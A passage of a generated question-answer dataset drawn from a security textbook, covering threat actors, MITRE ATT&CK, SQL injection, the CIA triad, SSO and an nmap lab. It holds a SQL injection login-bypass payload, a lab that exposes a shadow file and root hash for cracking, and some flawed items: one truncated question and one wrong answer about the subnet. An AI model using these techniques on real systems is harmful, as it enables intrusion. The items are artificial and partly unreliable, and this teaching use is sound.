concepts,\u201d what foundational principle is implicitly assumed to underpin the security of digital communications and data storage discussed within this textbook?", "answer": "Data confidentiality.", "explanation": "The text highlights cryptography as a key component of computer security, implying that a basic understanding of cryptographic principles is necessary for comprehending the techniques and mechanisms presented.", "question_token_count": 36, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 4, "choices": null}
{"context": "## 1.4. Threat Actors {#_computer_systems_security_planning_for_success.xhtml__threat_actors}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/anonymous.svg\" width=\"200\" alt=\"anonymous\" />\n\n</div>\n\n<figcaption><a href=\"https://pixabay.com/illustrations/anonymous-revolution-guy-fawkes-1235169/\" class=\"link\">Anonymous\n\nRevolution Guy Fawkes</a> is used under <a href=\"https://pixabay.com/service/license/\" class=\"link\">Pixabay\n\nLicense</a></figcaption>\n\n</figure>\n\nTo better be able to manage the risks of a data breach, it helps to be able to identify/understand the attacker or\n\nthreat actor involved. Just as there are many reasons an actor may attempt to gain unauthorized access there are also\n\nmany groups of threat actors.\n\nNeophytes making use of automated tools that they may not fully understand are often referred to a *script kiddies*. You\n\nmay hear other pejorative names as well such as lamer, noob, or luser, but the common thread is that these threat actors\n\nare *not* highly sophisticated. The same techniques used for automating defensive security can also be applied to\n\nautomating attacks. Unfortunately this means that you may encounter actors \\\"punching above their weight\\\" or using\n\ncomplex tools while having only a rudimentary understanding of what they do.\n\nHacktivist are threat actors that attack to further social or political ends. These groups can be very sophisticated.\n\nThe most well known hacktivist group is *Anonymous* which has been linked to several politically motivated attacks.\n\nOrganized crime is another element which may employ or support threat actors typically to make money. These groups\n\ntypically have access to more resources and contacts than a solo actor. It is important to note that threat actors with\n\nroots in organized crime may find it easier to migrate into other areas of crime due to their proximity to a large\n\ncriminal enterprise. For example, while it may be difficult for a script kiddie to broker the sale of valuable data, a\n\nhacker working with an organized crime syndicate may have people close to them that are familiar with the sale of stolen\n\ngoods.\n\nThe last group of threat actors, and arguably the group with the most resources, are threat actors working with or for\n\ngovernments and nation states. These groups may have the explicit or implicit permission of their country to commit\n\ncyber crimes targeting other nations. Given the constant threat and resources available to these groups, they are\n\nreferred to as an advanced persistent threat (APT). By utilizing the resources of a nation (often including its\n\nintelligence and military resources) APTs are a severe threat.\n\n:::\n\n::::: {.section .sect2 title=\"1.5. Security Plans\"}\n", "topic": "The characteristics and motivations of script kiddies, including their limited technical expertise and reliance on automated tools.", "question": "Considering the description of script kiddies \u2013 their reliance on automated tools and limited technical understanding \u2013 what specific operational vulnerability does this profile inherently introduce into a system\u2019s security posture?", "answer": "Predictable attack patterns.", "explanation": "Script kiddies, due to their lack of deep technical knowledge, frequently utilize automated tools and techniques that are often easily detected or bypassed by more experienced security professionals. This reliance creates a consistent, predictable pattern of activity that can be leveraged to identify and mitigate potential attacks.", "question_token_count": 36, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 6, "question_groundedness_score": 9, "avg_answer_token_count": 6, "choices": null}
{"context": "## 9.5. MITRE ATT&CK Framework {#_computer_systems_security_planning_for_success.xhtml__mitre_attck_framework}\nIn the [Malware](#_computer_systems_security_planning_for_success.xhtml__malware){.xref} chapter we covered Lockheed\n\nMartin's Cyber Killchain attack analysis framework. Cyber killchain is not the only analysis framework available, a\n\npopular alternative is the [MITRE ATT&CK framework](https://attack.mitre.org){.link}. ATT&CK has 14 sections that cover\n\nadversarial tactics, techniques, and common knowledge. Each section is separated into different matrices that have their\n\nown sub-techniques.\n\nDeveloped in 2013, the ATT&CK framework is a modern way of looking at an incident that can help drive decision making\n\nregarding response and continuity.\n\n::: {.section .sect3 title=\"9.5.1. Reconnaissance\"}\n\n\n### 9.5.1. Reconnaissance {#_computer_systems_security_planning_for_success.xhtml__reconnaissance}\nReconnaissance is the act of collecting information about a target. This typically involves vulnerability scanning,\n\nnetwork mapping, and phishing. Attackers are generally looking for weak links and a way in to the company. Understanding\n\nhow reconnaissance is performed can help a security team pick up on the precursors to an incident.\n\n:::\n\n::: {.section .sect3 title=\"9.5.2. Resource Development\"}\n", "topic": "What is the primary purpose of the MITRE ATT&CK framework in the context of cybersecurity incident response?", "question": "What is the core function of the MITRE ATT&CK framework within cybersecurity planning?", "answer": "To aid in incident response and decision-making.", "explanation": "The text states the framework \u201cis a modern way of looking at an incident that can help drive decision making regarding response and continuity.\u201d", "question_token_count": 18, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 9, "avg_answer_token_count": 10, "choices": null}
{"context": "### 5.5.5. SQL Injection {#_computer_systems_security_planning_for_success.xhtml__sql_injection}\nAs mentioned in the SSRF section, almost all web systems are supported by other servers running internally. One of the\n\nmost common scenarios is to have a web server which reaches out to an internal database. Relational databases utilize\n\nstructured query language (SQL) so a web application may generate many different SQL queries during its regular\n\noperations. If a user input is placed directly into the query, it can be possible to make the result function in a way\n\nthat was not intended or yield secret information from the database.\n\nTake a look at the following PHP code:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>$userName = $_POST[&#39;user_name&#39;]\n\n$pw = $_POST[&#39;password&#39;]\n\n$statement = &quot;SELECT * FROM users WHERE name=&#39;&quot; + $userName + &quot;&#39; AND password=&#39;&quot; + $pw + &quot;&#39;;&quot;</code></pre>\n\n</figure>\n\nIn the case where the user_name `admin`{.literal} and the password `password`{.literal} were submitted, the following\n\nSQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='password';`{.literal}\n\nIn the case where the user_name `admin`{.literal} and the password `' OR 1=1;`{.literal} were submitted, the following\n\nSQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='' OR 1=1;`{.literal}\n\nIn this second case, a user could login without needing a valid password.\n\n:::\n\n::: {.section .sect3 title=\"5.5.6. XML Injection\"}\n", "topic": "Explain how the provided PHP code is vulnerable to SQL injection.", "question": "How does the provided PHP code enable an attacker to bypass authentication?", "answer": "By injecting SQL code into the user name or password fields.", "explanation": "The code directly incorporates user input into an SQL query without proper sanitization or parameterization, allowing an attacker to manipulate the query's logic.", "question_token_count": 14, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 13, "choices": null}
{"context": "## 1.2. Learning the Lingo {#_computer_systems_security_planning_for_success.xhtml__learning_the_lingo}\nIn general, the technical fields are laden with acronyms and obtuse vocabulary. Unfortunately security is no exception\n\nto this rule. Three of the most important acronyms you should be aware of to start are *CIA*, *AAA*, and *DRY*.\n\n::: {.section .sect3 title=\"1.2.1. CIA\"}\n\n\n### 1.2.1. CIA {#_computer_systems_security_planning_for_success.xhtml__cia}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/cia.svg\" width=\"300\" alt=\"cia\" />\n\n</div>\n\n</figure>\n\nWhile the Central Intelligence Agency does have a role to play in information security, for our purposes CIA is an\n\nacronym used to remember the three foundational information security principles: confidentiality, integrity, and\n\navailability. These ideas form the cornerstone of security and should be ever-present in your thoughts.\n\n*Confidentiality* refers to the practice of keeping secret information secret. For example, if an e-commerce site stores\n\ncredit card numbers (a questionable practice to begin with) those credit card numbers should be kept *confidential*. You\n\nwould not want other users of the site or outsiders to have access to your credit card number. Many steps could be taken\n\nto ensure the confidentiality of user credit card numbers, but at this point it is enough to understand that maintaining\n\nconfidentiality is a principle of security.\n\n*Integrity* is an assurance that data has not been corrupted or purposefully tampered with. As we discussed previously,\n\ndata is very valuable, but how valuable is it if you can't be sure it is intact and reliable? In security we strive to\n\nmaintain integrity so that the system and even the controls we have in place to guard the system can be trusted. Imagine\n\nthat e-commerce site again. What would happen if an attacker could arbitrarily change delivery addresses stored in the\n\nsystem? Packages could be routed to improper addresses and stolen and honest customers would not receive what they\n\nordered, all because of an integrity violation.\n\n*Availability* means that a system should remain up and running to ensure that valid users have access to the data when\n\nneeded. In the simplest sense, you could ensure confidentiality and integrity by simply taking the system off line and\n\nnot allowing any access. Such a system would be useless and this final principle addresses that. Systems are designed to\n\nbe accessible and part of your security plan should be ensuring that they are. You will need to account for the costs of\n\nimplementing confidentiality and integrity and make sure that the resources are available to keep the system working. In\n\nan extreme case, denial of service (DoS) attacks can actually target availability. By keeping this principle in mind,\n\nhopefully you can mitigate some of those risks.\n\n:::\n\n::: {.section .sect3 title=\"1.2.2. AAA\"}\n", "topic": "Illustrate how the Authentication, Authorization, and Accounting (AAA) principles contribute to a secure e-commerce environment.", "question": "Considering the principles of Authentication, Authorization, and Accounting (AA", "answer": "Authentication would involve verifying a customer's identity upon login using a secure password system. Authorization would restrict access to order details based on the customer's role (e.g., customer vs. administrator). Accounting would log each customer\u2019s access to their order history, providing an audit trail.", "explanation": "Authentication verifies the identity of a user (e.g., through username and password), Authorization determines what a user is permitted to access or do (e.g., viewing order history but not modifying payment details), and Accounting tracks user activity (e.g., recording login times and data accessed).", "question_token_count": 13, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 2, "question_groundedness_score": 9, "avg_answer_token_count": 54, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Using the Linux `ip addr` command to display network interface information, including IP addresses and MAC addresses.", "question": "Based on the provided context, what is the IP address assigned to the `eth0` interface on the `scanner` container, and what does this IP address indicate about the network topology?", "answer": "172.20.0.2, indicating a /24 subnet.", "explanation": "The `ip addr` command reveals that the `eth0` interface on the `scanner` container has an IP address of `172.20.0.2`. This IP address falls within the `172.20.0.0/24` subnet, suggesting that the `scanner` is connected to a network segment with a 24-bit subnet mask, limiting the number of usable IP addresses.", "question_token_count": 39, "answer_correctness_score": 5, "explanation_validity_score": 3, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 15, "choices": null}
{"context": "### 7.3.9. Single Sign On (SSO) {#_computer_systems_security_planning_for_success.xhtml__single_sign_on_sso}\nGiven the ubiquitous nature of web applications, maintaining separate usernames and passwords can be difficult for\n\nusers. A recent trend has been to support Single Sign On, where one identity provider is used to confirm that users are\n\nwho they claim to be. There are a few protocols that make this possible, including SAML and OAuth.\n\nSAML stands for Security Assertion Markup Language and is an XML based Single Sign On solution. The SAML workflow\n\ncenters around the SAML identity provider or IDP. The following steps take place to grant access to a resource via SAML:\n\n::: {.ordered-list .arabic}\n\n1.  [User accesses a sevice]{.principal}\n\n2.  [User is redirected to SAML IDP with SAML request]{.principal}\n\n3.  [User logs in]{.principal}\n\n4.  [Credentials are verified]{.principal}\n\n5.  [SAML IDP sends credentials to the service]{.principal}\n\n:::\n\nOpenID is another protocol that allows users to authenticated using a third-party identity provider in a similar fashion\n\nto SAML. One of the main differences is that OpenID was designed to be decentralized, allowing for multiple IDPs for\n\nusers to choose from. In February 2014 OpenID introduced OpenID Connect (OIDC), a more modern system that allows IDPs to\n\nprovide information about users via a REST API. This move was largely in response to the popularity of OAuth.\n\nOAuth is a method for allowing websites to access parts of a user's profile with the user's permission. OAuth is not\n\n*technically* a full-fledged authentication protocol, but it is often used as part of one. The following diagram\n\nhighlights the differences between OpenID authentication and an OAuth flow:\n\n<figure class=\"image\">\n\n<div class=\"content\">\n\n<img src=\"images/oauth.svg\" width=\"800\" alt=\"oauth\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\"\n\nclass=\"link\">OpenID vs. Pseudo-Authentication using OAuth</a> by <a\n\nhref=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\" class=\"link\">Perhelion</a>\n\nused under <a href=\"https://commons.wikimedia.org/wiki/File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\"\n\nclass=\"link\">CC0 1.0</a></figcaption>\n\n</figure>\n\n::::\n\n::::: {.section .sect3 title=\"7.3.10. Kerberos\"}\n", "topic": "OAuth is a method for websites to access user profile information with user permission and is often used in conjunction with authentication protocols.", "question": "Considering the described distinctions between OpenID Connect and OAuth, how does the REST API approach of OpenID Connect represent a significant departure from the traditional OAuth flow, and what is the primary driver behind this architectural shift?", "answer": "The shift to a REST API approach in OpenID Connect was primarily driven by the rise of RESTful web services and the need for a simpler, standardized method for user information provisioning.", "explanation": "OpenID Connect utilizes a REST API for user information provisioning, contrasting with OAuth\u2019s reliance on a more complex flow. This shift was largely driven by the increasing popularity of RESTful web services and the need for a simpler, more standardized method to access user data.", "question_token_count": 43, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 6, "question_groundedness_score": 8, "avg_answer_token_count": 37, "choices": null}
{"context": "## Example Schedule {#_computer_systems_security_planning_for_success.xhtml__example_schedule}\nA sample schedule utilizing these resources in a 15 week semester is shown below:\n\n:::: table\n\n::: content\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| Week                  | Chapters              | Assignments                                   | Learning Outcomes     |\n\n+=======================+=======================+===============================================+=======================+\n\n| 1                     | [Introducti           | ::: embed                                     | 1.1, 1.2, 1.6, 2.7    |\n\n|                       | on](#_computer_system | [Lab: Think Like a                            |                       |\n\n|                       | s_security_planning_f | Hacker](#_computer_systems_security_pl        |                       |\n\n|                       | or_success.xhtml__int | anning_for_success.xhtml__lab_think_like_a_ha |                       |\n\n|                       | roduction){#_computer | cker){#_computer_systems_security_planning_fo |                       |\n\n|                       | _systems_security_pla | r_success.xhtml_xref-_lab_think_like_a_hacker |                       |\n\n|                       | nning_for_success.xht | .xref}\\                                       |                       |\n\n|                       | ml_xref-_introduction | [Introduction Review                          |                       |\n\n|                       | .xref}                | Questions](#_comp                             |                       |\n\n|                       |                       | uter_systems_security_planning_for_success.xh |                       |\n\n|                       |                       | tml_intro_review){#_computer_systems_security |                       |\n\n|                       |                       | _planning_for_success.xhtml_xref-intro_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 2                     | [Cryptograp           | ::: embed                                     | 1.2, 1.3, 1.6, 2.1,   |\n\n|                       | hy](#_computer_system | [Lab: Hash it                                 | 2.4, 2.5, 2.8, 3.9    |\n\n|                       | s_security_planning_f | Out](#_computer_sys                           |                       |\n\n|                       | or_success.xhtml__cry | tems_security_planning_for_success.xhtml__lab |                       |\n\n|                       | ptography){#_computer | _hash_it_out){#_computer_systems_security_pla |                       |\n\n|                       | _systems_security_pla | nning_for_success.xhtml_xref-_lab_hash_it_out |                       |\n\n|                       | nning_for_success.xht | .xref}\\                                       |                       |\n\n|                       | ml_xref-_cryptography | [Cryptography Review                          |                       |\n\n|                       | .xref}                | Questions](#_comput                           |                       |\n\n|                       |                       | er_systems_security_planning_for_success.xhtm |                       |\n\n|                       |                       | l_crypto_review){#_computer_systems_security_ |                       |\n\n|                       |                       | planning_for_success.xhtml_xref-crypto_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 3                     | [Malware](#_compu     | ::: embed                                     | 1.2, 1.3, 1.4, 2.5,   |\n\n|                       | ter_systems_security_ | [Lab: Malware                                 | 4.1, 4.3, 4.5         |\n\n|                       | planning_for_success. | Analysis](#_computer_systems_secur            |                       |\n\n|                       | xhtml__malware){#_com | ity_planning_for_success.xhtml__lab_malware_a |                       |\n\n|                       | puter_systems_securit | nalysis){#_computer_systems_security_planning |                       |\n\n|                       | y_planning_for_succes | _for_success.xhtml_xref-_lab_malware_analysis |                       |\n\n|                       | s.xhtml_xref-_malware | .xref}\\                                       |                       |\n\n|                       | .xref}                | [Malware Review                               |                       |\n\n|                       |                       | Questions](#_computer                         |                       |\n\n|                       |                       | _systems_security_planning_for_success.xhtml_ |                       |\n\n|                       |                       | malware_review){#_computer_systems_security_p |                       |\n\n|                       |                       | lanning_for_success.xhtml_xref-malware_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 4                     | [P                    | ::: embed                                     | 1.3, 1.6, 1.7, 3.1,   |\n\n|                       | rotocols](#_computer_ | [Lab: Scanning with                           | 3.2, 4.1              |\n\n|                       | systems_security_plan | nmap](#_computer_systems_security_            |                       |\n\n|                       | ning_for_success.xhtm | planning_for_success.xhtml__lab_scanning_with |                       |\n\n|                       | l__protocols){#_compu | _nmap){#_computer_systems_security_planning_f |                       |\n\n|                       | ter_systems_security_ | or_success.xhtml_xref-_lab_scanning_with_nmap |                       |\n\n|                       | planning_for_success. | .xref}\\                                       |                       |\n\n|                       | xhtml_xref-_protocols | [Protocols Review                             |                       |\n\n|                       | .xref}                | Questions](#_computer_sys                     |                       |\n\n|                       |                       | tems_security_planning_for_success.xhtml_prot |                       |\n\n|                       |                       | ocols_review){#_computer_systems_security_pla |                       |\n\n|                       |                       | nning_for_success.xhtml_xref-protocols_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 5                     | [Attacks](#_compu     | ::: embed                                     | 1.2, 1.3, 1.4, 1.8,   |\n\n|                       | ter_systems_security_ | Quiz 1\\                                       | 3.3, 3.4, 4.1, 4.2    |\n\n|                       | planning_for_success. | [Attacks Review                               |                       |\n\n|                       | xhtml__attacks){#_com | Questions](#_computer                         |                       |\n\n|                       | puter_systems_securit | _systems_security_planning_for_success.xhtml_ |                       |\n\n|                       | y_planning_for_succes | attacks_review){#_computer_systems_security_p |                       |\n\n|                       | s.xhtml_xref-_attacks | lanning_for_success.xhtml_xref-attacks_review |                       |\n\n|                       | .xref}                | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 6                     | ::: embed             | 